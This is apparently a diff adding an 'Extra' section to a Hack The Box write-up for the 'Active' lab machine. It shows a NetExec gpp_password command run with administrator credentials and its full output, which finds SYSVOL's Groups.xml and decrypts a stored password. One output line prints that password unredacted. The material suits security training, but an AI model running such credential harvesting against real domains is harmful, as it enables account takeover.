@@ -300,3 +300,41 @@ DC
 C:\Windows\system32> type c:\users\administrator\desktop\root.txt
 d01<REDACTED>c03
 ```
+
+## Extra
+
+If we had valid domain credentials, we could have used the NXC module `gpp_password` to enumerate and automatically decrypt passwords stored in GPOs:
+
+```bash
+$ nxc smb 10.10.10.100 -u 'administrator' -p 'Tic<REDACTED>968' -M gpp_password
+SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
+SMB         10.10.10.100    445    DC               [+] active.htb\svc_tgs:GPPstillStandingStrong2k18
+SMB         10.10.10.100    445    DC               [*] Enumerated shares
+SMB         10.10.10.100    445    DC               Share           Permissions     Remark
+SMB         10.10.10.100    445    DC               -----           -----------     ------
+SMB         10.10.10.100    445    DC               ADMIN$                          Remote Admin
+SMB         10.10.10.100    445    DC               C$                              Default share
+SMB         10.10.10.100    445    DC               IPC$                            Remote IPC
+SMB         10.10.10.100    445    DC               NETLOGON        READ            Logon server share
+SMB         10.10.10.100    445    DC               Replication     READ
+SMB         10.10.10.100    445    DC               SYSVOL          READ            Logon server share
+SMB         10.10.10.100    445    DC               Users           READ
+GPP_PASS... 10.10.10.100    445    DC               [+] Found SYSVOL share
+GPP_PASS... 10.10.10.100    445    DC               [*] Searching for potential XML files containing passwords
+SMB         10.10.10.100    445    DC               [*] Started spidering
+SMB         10.10.10.100    445    DC               [*] Spidering .
+SMB         10.10.10.100    445    DC               //10.10.10.100/SYSVOL/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml [lastm:'2018-07-18 21:46' size:533]
+SMB         10.10.10.100    445    DC               [*] Done spidering (Completed in 3.4433553218841553)
+GPP_PASS... 10.10.10.100    445    DC               [*] Found active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
+GPP_PASS... 10.10.10.100    445    DC               [+] Found credentials in active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
+GPP_PASS... 10.10.10.100    445    DC               Password: GPP<REDACTED>k18
+GPP_PASS... 10.10.10.100    445    DC               action: U
+GPP_PASS... 10.10.10.100    445    DC               newName:
+GPP_PASS... 10.10.10.100    445    DC               fullName:
+GPP_PASS... 10.10.10.100    445    DC               description:
+GPP_PASS... 10.10.10.100    445    DC               changeLogon: 0
+GPP_PASS... 10.10.10.100    445    DC               noChange: 1
+GPP_PASS... 10.10.10.100    445    DC               neverExpires: 1
+GPP_PASS... 10.10.10.100    445    DC               acctDisabled: 0
+GPP_PASS... 10.10.10.100    445    DC               userName: active.htb\SVC_TGS
+```
